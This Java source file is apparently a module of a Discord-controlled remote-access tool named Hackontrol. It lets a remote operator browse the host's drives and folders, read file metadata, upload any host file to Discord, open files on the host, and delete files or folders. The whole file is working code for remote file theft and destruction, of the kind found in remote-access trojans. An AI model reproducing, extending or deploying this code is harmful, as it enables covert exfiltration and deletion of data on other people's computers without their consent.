package com.khopan.hackontrol.panel;

import java.awt.Desktop;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.function.Consumer;

import javax.imageio.ImageIO;
import javax.swing.filechooser.FileSystemView;

import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.ModalManager;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.service.interaction.context.ModalContext;
import com.khopan.hackontrol.service.interaction.context.Question;
import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolFile;
import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.LargeMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.ISendableReply;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class FilePanel extends Panel {
	private static final String PANEL_NAME = "file";

	private static final Button BUTTON_LIST_ROOT       = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");

	private static final String KEY_SHELL_OBJECT_INDEX = "shellObjectIndex";

	@Override
	public String panelName() {
		return FilePanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(null, context, null));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(FilePanel.BUTTON_LIST_ROOT)
				.build()
		};
	}

	private void sendFileList(File folder, IReplyCallback callback, ButtonContext deletingContext) {
		File[] files;
		String pathName;

		if(folder == null) {
			files = File.listRoots();
			pathName = "SYSTEMROOT";
		} else {
			if(!folder.isDirectory()) {
				folder = folder.getParentFile();
			}

			files = folder.listFiles();
			pathName = folder.getAbsolutePath();

			if(pathName.endsWith("\\")) {
				pathName += '\\';
			}
		}

		if(files.length == 1 && files[0].isDirectory()) {
			this.sendFileList(files[0], callback, deletingContext);
			return;
		}

		List<File> fileList = new ArrayList<>();
		List<File> folderList = new ArrayList<>();

		for(File file : files) {
			if(file.isDirectory()) {
				folderList.add(file);
			} else {
				fileList.add(file);
			}
		}

		StringBuilder builder = new StringBuilder();
		builder.append("**");
		builder.append(pathName);
		builder.append("**");
		this.appendShellObject(builder, "File", fileList, this.appendShellObject(builder, "Folder", folderList, 0, folder == null), false);
		File finalFolder = folder;
		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> {
			List<ItemComponent> list = new ArrayList<>();
			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "View", context -> this.buttonView(context, fileList, folderList)));

			if(!folderList.isEmpty()) {
				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Inside", context -> this.buttonInside(context, folderList)));
			}

			if(finalFolder != null) {
				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Return", context -> this.sendFileList(finalFolder.getParentFile(), context, context)));
				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Upload", context -> {}));
			}

			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", context -> this.sendFileList(finalFolder, context, context)));
			list.add(HackontrolButton.delete(identifiers));
			request.addActionRow(list);
		});

		if(deletingContext != null) {
			HackontrolButton.deleteMessages(deletingContext);
		}
	}

	private void sendFileView(File file, Consumer<MessageCreateData> consumer) {
		EmbedBuilder embedBuilder = new EmbedBuilder();
		embedBuilder.setTitle(file.getName());
		boolean exist = file.exists();
		embedBuilder.setColor(exist ? 0xFF57F287 : 0xFFED4245);
		FileUpload upload = null;

		try {
			ByteArrayOutputStream stream = new ByteArrayOutputStream();
			ImageIO.write(HackontrolFile.getFileImage(file, 128, 128), "png", stream);
			upload = FileUpload.fromData(stream.toByteArray(), "icon.png");
			embedBuilder.setThumbnail("attachment://icon.png");
		} catch(Throwable Errors) {

		}

		this.field(embedBuilder, "Path", file.getAbsolutePath());
		FileSystemView fileSystemView = FileSystemView.getFileSystemView();
		this.field(embedBuilder, "Display Name", fileSystemView.getSystemDisplayName(file));
		this.field(embedBuilder, "Type", fileSystemView.getSystemTypeDescription(file));

		try {
			BasicFileAttributes attributes = Files.getFileAttributeView(file.toPath(), BasicFileAttributeView.class).readAttributes();
			this.field(embedBuilder, "Created",  String.format(Locale.ROOT, "<t:%d:R>", attributes.creationTime().toMillis()     / 1000L));
			this.field(embedBuilder, "Modified", String.format(Locale.ROOT, "<t:%d:R>", attributes.lastModifiedTime().toMillis() / 1000L));
			this.field(embedBuilder, "Accessed", String.format(Locale.ROOT, "<t:%d:R>", attributes.lastAccessTime().toMillis()   / 1000L));
		} catch(Throwable Errors) {

		}

		long fileSize;

		if(file.isDirectory()) {
			FileCountAndSize countAndSize = HackontrolFile.getFileCountAndSize(file);
			fileSize = countAndSize.folderSize;
			this.field(embedBuilder, "File Count", String.valueOf(countAndSize.fileCount));
		} else {
			fileSize = file.length();
		}

		this.field(embedBuilder, "Size", HackontrolFile.getFileSizeDisplay(fileSize));
		MessageCreateBuilder messageBuilder = new MessageCreateBuilder();
		messageBuilder.addEmbeds(embedBuilder.build());

		if(upload != null) {
			messageBuilder.addFiles(upload);
		}

		List<ItemComponent> buttonList = new ArrayList<>();
		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Download", context -> {
			if(!this.checkFileExistence(context, file)) {
				return;
			}

			TimeSafeReplyHandler.start(context, download -> {
				try {
					download.accept(MessageCreateData.fromFiles(HackontrolFile.upload(file)));
				} catch(Throwable Errors) {
					HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(download), Errors);
				}
			});
		}));

		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Open", context -> {
			if(!this.checkFileExistence(context, file)) {
				return;
			}

			try {
				Desktop.getDesktop().open(file);
				context.deferEdit().queue();
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.reply(), Errors);
			}
		}));

		buttonList.add(ButtonManager.dynamicButton(ButtonType.DANGER, "Delete " + (exist && file.isFile() ? "File" : "Folder"), context -> {
			if(!this.checkFileExistence(context, file)) {
				return;
			}

			Question.positive(context.reply(), "Are you sure you want to delete '" + file.getAbsolutePath() + "'?", QuestionType.YES_NO, () -> {
				if(!HackontrolFile.delete(file)) {
					HackontrolError.message(context.message(), "Failed to delete '" + file.getAbsolutePath() + '\'');
					return;
				}

				HackontrolMessage.delete(context);
			});
		}));

		buttonList.add(HackontrolButton.delete());
		messageBuilder.addActionRow(buttonList);
		consumer.accept(messageBuilder.build());
	}

	private void buttonView(ButtonContext context, List<File> fileList, List<File> folderList) {
		int folderSize = folderList.size();
		int maximum = fileList.size() + folderSize;

		if(maximum == 1) {
			TimeSafeReplyHandler.start(context, consumer -> this.sendFileView(folderSize == 0 ? fileList.get(0) : folderList.get(0), consumer));
			return;
		}

		context.replyModal(ModalManager.dynamicModal("View", modalContext -> {
			int index = this.parseIndex(modalContext, maximum);

			if(index != -1) {
				TimeSafeReplyHandler.start(modalContext, consumer -> this.sendFileView(index >= folderSize ? fileList.get(index - folderSize) : folderList.get(index), consumer));
			}
		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(maximum).length()).setPlaceholder("1 - " + maximum).build()).build()).queue();
	}

	private void buttonInside(ButtonContext context, List<File> folderList) {
		if(folderList.size() == 1) {
			this.sendFileList(folderList.get(0), context, context);
			return;
		}

		int size = folderList.size();
		context.replyModal(ModalManager.dynamicModal("Inside", modalContext -> {
			int index = this.parseIndex(modalContext, size);

			if(index != -1) {
				this.sendFileList(folderList.get(index), modalContext, context);
			}
		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Folder Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(size).length()).setPlaceholder("1 - " + size).build()).build()).queue();
	}

	private int appendShellObject(StringBuilder builder, String name, List<File> list, int index, boolean absolute) {
		if(list.isEmpty()) {
			return index;
		}

		int size = list.size();
		builder.append("\n***");
		builder.append(name);

		if(size != 1) {
			builder.append('s');
		}

		builder.append(" (");
		builder.append(size);
		builder.append(" item");

		if(size != 1) {
			builder.append('s');
		}

		builder.append(")***");

		for(File file : list) {
			builder.append("\n`");
			builder.append(++index);
			builder.append(") ");
			builder.append(absolute ? file.getAbsolutePath() : file.getName());
			builder.append('`');
		}

		return index;
	}

	private int parseIndex(ModalContext context, int maximum) {
		int index;

		try {
			index = Integer.parseInt(context.getValue(FilePanel.KEY_SHELL_OBJECT_INDEX).getAsString());
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return -1;
		}

		if(index < 1 || index > maximum) {
			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected 1 - " + maximum);
			return -1;
		}

		return index - 1;
	}

	private void field(EmbedBuilder builder, String label, String value) {
		builder.addField(label, value == null ? "Unavailable" : value, true);
	}

	private boolean checkFileExistence(ISendableReply reply, File file) {
		if(!file.exists()) {
			HackontrolError.message(reply.reply(), (file.isDirectory() ? "Folder" : "File") + " '" + file.getAbsolutePath() + "' does not exist");
			return false;
		}

		return true;
	}
}
